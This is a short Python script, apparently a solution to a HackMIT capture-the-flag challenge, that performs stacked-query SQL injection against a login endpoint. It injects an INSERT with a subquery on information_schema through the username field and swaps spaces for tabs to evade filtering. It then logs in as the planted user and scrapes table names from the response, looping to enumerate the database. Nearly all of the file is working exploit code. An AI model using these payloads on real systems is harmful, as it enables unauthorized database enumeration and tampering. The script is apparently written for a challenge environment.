# -*- coding: utf-8 -*-
import string
import random

import requests

url = 'https://gradebase.hackmit.academy/u/Vivswan_5c6aaa/login'
tables = ['grade', 'pg_type', 'pg_policy', 'pg_settings', 'pg_subscription', 'pg_stat_user_tables', 'pg_stat_xact_user_tables', 'pg_attribute', 'pg_proc', 'pg_class', 'pg_attrdef', 'pg_constraint', 'pg_statio_all_tables', 'pg_statio_sys_tables', 'pg_statio_user_tables', 'pg_stat_all_indexes']

while True:
    requests.post("https://gradebase.hackmit.academy/u/Vivswan_5c6aaa/reset")
    data = {
        # 'username': "Vivswan_5c6aaa'; INSERT INTO user values (10, 'abc') --",
        'username': "Vivswan_5c6aaa'; INSERT INTO \"user\" values (10, 'abc', (SELECT table_name FROM information_schema.TABLES WHERE not table_name = 'user' ",
        'password': "%"
    }
    for i in tables:
        data['username'] += f" and not table_name='{i}' "
    data['username'] += " LIMIT 1))  --"

    data['username'] = data['username'].replace(" ", " \t ")
    x = requests.post(url, data=data)
    print(x.text)

    x = requests.post(url, data={'username': 'abc'})
    for i in x.text.split("\n"):
        if i.__contains__("Year"):
            tables.append(i.replace("Year:", "").replace("<h5>", "").replace("</h5>", "").strip())
            print(tables)

